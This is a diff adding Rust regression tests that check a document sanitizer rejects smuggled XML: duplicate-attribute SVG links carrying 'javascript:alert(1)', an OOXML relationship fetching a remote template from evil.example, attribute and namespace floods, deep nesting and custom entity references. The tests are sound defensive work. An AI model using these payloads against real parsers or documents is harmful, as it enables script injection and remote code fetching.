@@ -1277,3 +1277,210 @@ fn bug_cdr_09() {
 fn bug_cdr_10() {
     test_worker_pipe_protocol_roundtrip();
 }
+
+#[test]
+fn test_xml_duplicate_attribute_smuggling_and_excessive_attrs_rejected_rustsec_2026_0194() {
+    let mut policy = SanitizationPolicy::default();
+    policy.allow_svg = true;
+    let engine = CdrEngine::new(policy);
+
+    // 1. Duplicate attribute smuggling in SVG (e.g. two `href` attributes on one element)
+    let dup_attr_svg = br##"<svg xmlns="http://www.w3.org/2000/svg"><a href="#safe" href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>"##;
+    let dup_res = engine.sanitize(dup_attr_svg);
+    assert!(
+        matches!(
+            dup_res,
+            Err(sentinel_cdr::CdrError::ParserCorruption(ref msg))
+                if msg.contains("Duplicate XML attribute")
+        ),
+        "Duplicate XML attributes on a single element must fail with ParserCorruption (RUSTSEC-2026-0194), got: {dup_res:?}"
+    );
+
+    // 2. Duplicate TargetMode smuggling in OOXML .rels (`TargetMode="External" TargetMode="Internal"`)
+    let mut smuggled_rels_zip = Vec::new();
+    {
+        let mut writer = ZipWriter::new(Cursor::new(&mut smuggled_rels_zip));
+        let opts = SimpleFileOptions::default();
+        writer
+            .start_file("[Content_Types].xml", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(
+                br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>"#,
+            )
+            .expect("write_all should succeed");
+        writer
+            .start_file("word/document.xml", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(br#"<w:document><w:body><w:p><w:t>Test</w:t></w:p></w:body></w:document>"#)
+            .expect("write_all should succeed");
+        writer
+            .start_file("word/_rels/document.xml.rels", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(
+                br#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/payload.dotm" TargetMode="External" TargetMode="Internal"/></Relationships>"#,
+            )
+            .expect("write_all should succeed");
+        writer.finish().expect("finish should succeed");
+    }
+    let rels_res = engine.sanitize(&smuggled_rels_zip);
+    assert!(
+        matches!(
+            rels_res,
+            Err(sentinel_cdr::CdrError::ParserCorruption(ref msg))
+                if msg.contains("Duplicate XML attribute")
+        ),
+        "Duplicate TargetMode attribute smuggling in OOXML .rels must fail closed with ParserCorruption (RUSTSEC-2026-0194), got: {rels_res:?}"
+    );
+
+    // 3. Excessive attributes (> MAX_XML_ATTRIBUTES_PER_ELEMENT = 256)
+    let mut excessive_svg = String::from(r#"<svg xmlns="http://www.w3.org/2000/svg"><rect "#);
+    for idx in 0..260 {
+        excessive_svg.push_str(&format!(r#"data-attr-{idx}="v" "#));
+    }
+    excessive_svg.push_str("/></svg>");
+    let excessive_res = engine.sanitize(excessive_svg.as_bytes());
+    assert!(
+        matches!(
+            excessive_res,
+            Err(sentinel_cdr::CdrError::ResourceLimitExceeded(ref msg))
+                if msg.contains("maximum attribute count")
+        ),
+        "Element exceeding 256 XML attributes must fail with ResourceLimitExceeded (RUSTSEC-2026-0194), got: {excessive_res:?}"
+    );
+}
+
+#[test]
+fn test_xml_namespace_flood_and_element_depth_rejected_rustsec_2026_0195() {
+    let mut policy = SanitizationPolicy::default();
+    policy.allow_svg = true;
+    let engine = CdrEngine::new(policy);
+
+    // 1. Namespace declaration flood (> MAX_XMLNS_DECLS_PER_ELEMENT = 32)
+    let mut xmlns_flood_svg = String::from("<svg ");
+    for idx in 0..35 {
+        xmlns_flood_svg.push_str(&format!(r#"xmlns:ns{idx}="https://example.com/ns/{idx}" "#));
+    }
+    xmlns_flood_svg.push_str("><rect width=\"10\" height=\"10\"/></svg>");
+    let flood_res = engine.sanitize(xmlns_flood_svg.as_bytes());
+    assert!(
+        matches!(
+            flood_res,
+            Err(sentinel_cdr::CdrError::ResourceLimitExceeded(ref msg))
+                if msg.contains("maximum xmlns declarations")
+        ),
+        "Element exceeding 32 xmlns declarations must fail with ResourceLimitExceeded (RUSTSEC-2026-0195), got: {flood_res:?}"
+    );
+
+    // 2. Oversized xmlns URI (> MAX_XMLNS_URI_BYTES = 2048)
+    let huge_uri = "a".repeat(2100);
+    let huge_xmlns_svg = format!(
+        r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:custom="https://example.com/{huge_uri}"><rect width="1" height="1"/></svg>"#
+    );
+    let huge_res = engine.sanitize(huge_xmlns_svg.as_bytes());
+    assert!(
+        matches!(
+            huge_res,
+            Err(sentinel_cdr::CdrError::ResourceLimitExceeded(ref msg))
+                if msg.contains("xmlns URI exceeds")
+        ),
+        "Element with xmlns URI > 2048 bytes must fail with ResourceLimitExceeded (RUSTSEC-2026-0195), got: {huge_res:?}"
+    );
+
+    // 3. Dangerous URI scheme inside xmlns declaration
+    let dangerous_xmlns_svg =
+        br#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xss="javascript:alert(1)"><rect width="1" height="1"/></svg>"#;
+    let scheme_res = engine.sanitize(dangerous_xmlns_svg);
+    assert!(
+        matches!(
+            scheme_res,
+            Err(sentinel_cdr::CdrError::ParserCorruption(ref msg))
+                if msg.contains("Forbidden URI scheme in xmlns")
+        ),
+        "Element with javascript: scheme in xmlns URI must fail with ParserCorruption (RUSTSEC-2026-0195), got: {scheme_res:?}"
+    );
+
+    // 4. Deep element nesting (> MAX_XML_ELEMENT_DEPTH = 256)
+    let mut deep_svg = String::from(r#"<svg xmlns="http://www.w3.org/2000/svg">"#);
+    for _ in 0..260 {
+        deep_svg.push_str("<g>");
+    }
+    deep_svg.push_str(r#"<rect width="1" height="1"/>"#);
+    for _ in 0..260 {
+        deep_svg.push_str("</g>");
+    }
+    deep_svg.push_str("</svg>");
+    let deep_res = engine.sanitize(deep_svg.as_bytes());
+    assert!(
+        matches!(
+            deep_res,
+            Err(sentinel_cdr::CdrError::ResourceLimitExceeded(ref msg))
+                if msg.contains("nesting depth")
+        ),
+        "XML element nesting depth > 256 must fail with ResourceLimitExceeded (RUSTSEC-2026-0195), got: {deep_res:?}"
+    );
+
+    // 5. Event::GeneralRef / is_allowed_xml_general_ref validation:
+    //    - Custom entity references (&xxe;) in SVG are stripped and recorded as SVG_XML_ENTITY while &amp; and &#x20; are preserved.
+    let entity_svg = br#"<svg xmlns="http://www.w3.org/2000/svg"><text>Safe &amp; &#x20; &xxe; text</text></svg>"#;
+    let (clean_svg_bytes, svg_report) = engine
+        .sanitize(entity_svg)
+        .expect("SVG with stripped custom entity should sanitize cleanly");
+    let clean_svg_str = String::from_utf8_lossy(&clean_svg_bytes);
+    assert!(
+        !clean_svg_str.contains("&xxe;"),
+        "Custom XML entity reference &xxe; must be stripped from SVG"
+    );
+    assert!(
+        clean_svg_str.contains("&amp;"),
+        "Standard predefined entity &amp; must be preserved"
+    );
+    assert!(
+        svg_report
+            .stripped_elements
+            .iter()
+            .any(|item| item.element_type == "SVG_XML_ENTITY" && item.location_path == "&xxe;"),
+        "SVG report must record removal of &xxe; entity"
+    );
+
+    //    - Custom entity references in OOXML .rels fail closed with ParserCorruption.
+    let mut entity_rels_zip = Vec::new();
+    {
+        let mut writer = ZipWriter::new(Cursor::new(&mut entity_rels_zip));
+        let opts = SimpleFileOptions::default();
+        writer
+            .start_file("[Content_Types].xml", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(
+                br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>"#,
+            )
+            .expect("write_all should succeed");
+        writer
+            .start_file("word/document.xml", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(br#"<w:document><w:body><w:p><w:t>Test</w:t></w:p></w:body></w:document>"#)
+            .expect("write_all should succeed");
+        writer
+            .start_file("word/_rels/document.xml.rels", opts)
+            .expect("start_file should succeed");
+        writer
+            .write_all(
+                br#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">&xxe;<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>"#,
+            )
+            .expect("write_all should succeed");
+        writer.finish().expect("finish should succeed");
+    }
+    let entity_rels_res = engine.sanitize(&entity_rels_zip);
+    assert!(
+        matches!(
+            entity_rels_res,
+            Err(sentinel_cdr::CdrError::ParserCorruption(ref msg))
+                if msg.contains("Custom XML entity reference forbidden")
+        ),
+        "Custom XML entity reference in .rels must fail closed with ParserCorruption, got: {entity_rels_res:?}"
+    );
+}
